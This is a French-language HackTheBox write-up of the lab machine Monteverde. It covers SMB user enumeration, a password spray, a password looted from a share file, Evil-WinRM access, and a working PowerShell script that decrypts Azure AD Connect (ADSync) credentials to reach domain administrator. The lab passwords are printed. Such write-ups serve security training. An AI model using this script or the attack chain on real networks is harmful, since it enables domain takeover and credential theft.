---
title: HTB | Monteverde
description: 
slug: monteverde-htb
date: 2025-07-20 00:00:00+0000
#image: cover.png
categories:
    - HackTheBox
tags:
    - Windows
    - Medium
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Monteverde cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Monteverde</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Windows</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.172</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Medium</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
SABatchJobs:SABatchJobs
mhope:4n0therD4y@n0th3r$
administrator:d0m@in4dminyeah!
```

## Enumeration

### nmap
```bash
$ nmap -sC -sV -An -T4 -vvv -p- 10.10.10.172
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-17 23:38 CEST
...
PORT   STATE SERVICE    REASON    VERSION
53/tcp open  domain  syn-ack ttl 127 Simple DNS Plus
88/tcp open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-17 21:39:43Z)
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap    syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?  syn-ack ttl 127
593/tcp   open  ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped syn-ack ttl 127
3268/tcp  open  ldap    syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped syn-ack ttl 127
5985/tcp  open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf  syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49750/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
```

## Foothold

### Getting users using nxc
Avec `nxc smb` et l'utilisateur anonyme on récupère une liste d'utilisateurs.
```bash
$ nxc smb 10.10.10.172 -u '' -p '' --users | tr -s ' ' | cut -d ' ' -f 5 | head -n13 | tail -n 10 | tee users.txt
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

### Password Spray
On tente un **password spray** avec "user == password" et on découvre les identifiants suivants:
- `SABatchJobs:SABatchJobs`
```bash
$ nxc smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success --no-bruteforce
SMB   10.10.10.172 445 MONTEVERDE    [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB   10.10.10.172 445 MONTEVERDE    [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB   10.10.10.172 445 MONTEVERDE    [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB   10.10.10.172 445 MONTEVERDE    [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB   10.10.10.172 445 MONTEVERDE    [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB   10.10.10.172 445 MONTEVERDE    [-] MEGABANK.LOCAL\svc-ata:svc-ata STATUS_LOGON_FAILURE 
SMB   10.10.10.172 445 MONTEVERDE    [-] MEGABANK.LOCAL\svc-bexec:svc-bexec STATUS_LOGON_FAILURE 
SMB   10.10.10.172 445 MONTEVERDE    [-] MEGABANK.LOCAL\svc-netapp:svc-netapp STATUS_LOGON_FAILURE 
SMB   10.10.10.172 445 MONTEVERDE    [-] MEGABANK.LOCAL\dgalanos:dgalanos STATUS_LOGON_FAILURE 
SMB   10.10.10.172 445 MONTEVERDE    [-] MEGABANK.LOCAL\roleary:roleary STATUS_LOGON_FAILURE 
SMB   10.10.10.172 445 MONTEVERDE    [-] MEGABANK.LOCAL\smorgan:smorgan STATUS_LOGON_FAILURE
```

### 'user$' and 'azure_uploads' smb shares : READ ACCESS
Avec smbmap on trouve le share 'user$' et 'azure_uploads' accessibles en lecture :
```bash
smbmap -H "10.10.10.172" -u SABatchJobs -p SABatchJobs

 ________  ___   ___  _______   ___   ___    __   _______
   /"    )|"  \ /"  ||   _  "\ |"  \ /"  |  /""\    |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   | / \   (. |__) :)
   \___  \ /\  \/. ||:  \/   /\   \/. |   /' /\  \  |:  ____/
 __/  \   |: \.  |(|  _  \  |: \.  |  //  __'  \ (|  /
   /" \   :) |.  \ /:  ||: |_)  :)|.  \ /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/ \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
      https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                    
                                                    
[+] IP: 10.10.10.172:445	Name: MEGABANK.LOCAL   	Status: Authenticated
	Disk              	Permissions	Comment
	----              	-----------	-------
	ADMIN$           	NO ACCESS	Remote Admin
	azure_uploads          	READ ONLY	
	C$            	NO ACCESS	Default share
	E$            	NO ACCESS	Default share
	IPC$             	READ ONLY	Remote IPC
	NETLOGON            	READ ONLY	Logon server share 
	SYSVOL           	READ ONLY	Logon server share 
	users$           	READ ONLY
```
On remarque que azure_uploads est vide.

Dans users$ on trouve le dossier d'un autre utilisateur "**mhope**" avec un fichier `azure.xml` :
```bash
$ smbclient //10.10.10.172/users$ -U MEGABANK.LOCAL/SABatchJobs      
Password for [MEGABANK.LOCAL\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .           D  0  Fri Jan  3 14:12:48 2020
  ..          D  0  Fri Jan  3 14:12:48 2020
  dgalanos       D  0  Fri Jan  3 14:12:30 2020
  mhope          D  0  Fri Jan  3 14:41:18 2020
  roleary        D  0  Fri Jan  3 14:10:30 2020
  smorgan        D  0  Fri Jan  3 14:10:24 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \> cd mhope
smb: \mhope\> ls
  .           D  0  Fri Jan  3 14:41:18 2020
  ..          D  0  Fri Jan  3 14:41:18 2020
  azure.xml        AR  1212  Fri Jan  3 14:40:23 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \mhope\> get azure.xml 
getting file \mhope\azure.xml of size 1212 as azure.xml (15.0 KiloBytes/sec) (average 15.0 KiloBytes/sec)
```
Dans ce fichier se trouve un mot de passe `4n0therD4y@n0th3r$`:
```bash
cat azure.xml 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
 <TN RefId="0">
   <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
   <T>System.Object</T>
 </TN>
 <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
 <Props>
   <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
   <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
   <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
   <S N="Password">4n0therD4y@n0th3r$</S>
 </Props>
  </Obj>
</Objs>#      
```

### Evil-winrm : mhope -> user flag
On obtient un accès via evil winrm en tant que **mhope** avec le mot de passe trouvé précédemment `4n0therD4y@n0th3r$` :
```bash
evil-winrm -u mhope -p '4n0therD4y@n0th3r$' -i "10.10.10.172"
          
Evil-WinRM shell v3.7
          
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop> cat "C:/Users/mhope/Desktop/user.txt"
4437.....5f01
```

## Privilege Escalation

### mhope Group : Azure Admins
On observe que mhope fait partie du groupe `Azure Admins`. 
```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name          Type    SID            Attributes
=======================================
...
MEGABANK\Azure Admins        Group   S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
...
```

### SQL Server: ADSync database
On observer une processus "sqlservr".
```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> Get-Process sqlservr

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    832     114   406004     275560              3436   0 sqlservr
```
On remarque que **sqlcmd** est installé et on observe une base de donnée "ADSync". On peut bien effectuer des requêtes vers la base de donnée sans utiliser de user/password :
```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -Q 'SELECT name FROM sys.databases'
name
--------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
ADSync

(5 rows affected)
```

### Script
On trouve un script de `xpn` sur github. Ce script permet de se connecter à la base de donnée `ADSync`, d'extraire la configuration (chiffrée), puis de la déchiffrer. On obtient alors le mot de passe de l'administrator. Le script est basé sur l'utilisation des infos de la base de données puis du binaire 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll' pour réussir à récupérer la configuration contenant les creds administrateur :

https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545

En utilisant le script, on remarque qu'il ne fonctionne pas. Les lignes de code permettant la connection à la base de données semblent incorrectes :
```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
```

En cherchant sur internet, j'ai pu corriger la ligne de code permettant la connexion à la bdd. De plus, j'ai pu remarquer certaines erreurs avec des guillemets dans un format suspect. J'ai bien remplacé les guillemets par "'" ou '"'.

```bash
Write-Host "AD Connect Sync Credential Extract POC"

$SQLServer = "127.0.0.1"
$SQLDBName = "ADSync"
$client = New-Object System.Data.SqlClient.SqlConnection  
$client.ConnectionString = "Server = $SQLServer; Database = $SQLDBName; Integrated Security = True"
$client.Open()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

Write-Host $decrypted

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

### Output
Après correction des guillements, on execute le .ps1 et obtient les creds admin :
```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> .\decrypt.ps1
AD Connect Sync Credential Extract POC
<encrypted-attributes>
 <attribute name="password">d0m@in4dminyeah!</attribute>
</encrypted-attributes>

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

### Administrator pwned
```bash
[Jul 20, 2025 - 14:56:12 (CEST)] exegol-pentest Monteverde # evil-winrm -u "administrator" -p 'd0m@in4dminyeah!'  -i 10.10.10.172
          
Evil-WinRM shell v3.7
          
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
9f15.....9bf4
```

## Tips
- Toujours bien vérifier les scripts trouvés. Debug puis trouver l'erreur. Attention au guillemets suspects, toujours remplacer par '"' ou '"'.